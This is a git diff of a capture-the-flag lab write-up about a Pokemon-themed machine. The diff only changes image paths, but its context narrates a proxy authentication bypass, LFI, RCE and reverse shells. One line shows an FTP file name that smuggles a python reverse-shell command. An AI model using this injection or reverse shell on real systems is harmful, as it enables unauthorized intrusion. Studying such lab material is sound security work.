@@ -23,23 +23,23 @@ Anonymous logins does not work for this site. We can take a look at the HTTP sit
 
 It's a Pokemon based website:
 
-<figure><img src="../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (43) (6).png" alt=""><figcaption></figcaption></figure>
 
 The admin portal requires credentials to access:
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>
 
 We can take a look at the Pokatdex and see that there are entries for each specific creature. Props to the creator for designing these:
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (7).png" alt=""><figcaption></figcaption></figure>
 
 When we try to view the entries, we just see this:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>
 
 The URL visited `http://10.129.95.191/pokeapi.php?id=6`, which might be relevant later on. I tested LFI and other types of injection, but nothing worked. I took a closer look at the administrator login, and found that if I keyed in wrong credentails, I got a unique error.
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
 
 For some reason, it was redirecting me to port 81 on the localhost. This means that some type of proxy is being used to forward the traffic to the right destination. It's called a reverse proxy, and looking for exploits for it led me to this:
 
@@ -47,7 +47,7 @@ For some reason, it was redirecting me to port 81 on the localhost. This means t
 
 Based on the PoC, this is a misconfiguration regarding the proxy used for the `/admin` directory. We can test it out and find that we have bypassed authentication using this method and get a 403 instead.
 
-<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (31) (1).png" alt=""><figcaption></figcaption></figure>
 
 I tried a `gobuster` scan on this new URL to see if we can find new files to access, and it seems `server-status` has been left publicly available.
 
@@ -89,7 +89,7 @@ There are loads of requests, and it seems that there's an extra directory at `ad
 
 This was a dashboard of some sort.
 
-<figure><img src="../../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (40) (2).png" alt=""><figcaption></figcaption></figure>
 
 The URL is `http://10.129.95.191/admin../admin_staging/index.php?page=dashboard.php`. This could be vulnerable to LFI. I used `wfuzz` to see what files existed on the page using the LFI wordlist. Ideally, we are looking for some type of configuration files.&#x20;
 
@@ -167,7 +167,7 @@ Great, we now have RCE. We just need to include a `bash` reverse shell one-liner
 
 After viewing the page again, we would get a shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (5) (3).png" alt=""><figcaption></figcaption></figure>
 
 We can grab the user flag.
 
@@ -411,6 +411,6 @@ ftp> put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\
 
 Remember to have a backslash behind all spaces and spaces to allow the upload to work. After waiting for a little while, we would get a reverse shell on the specified port.&#x20;
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (2).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
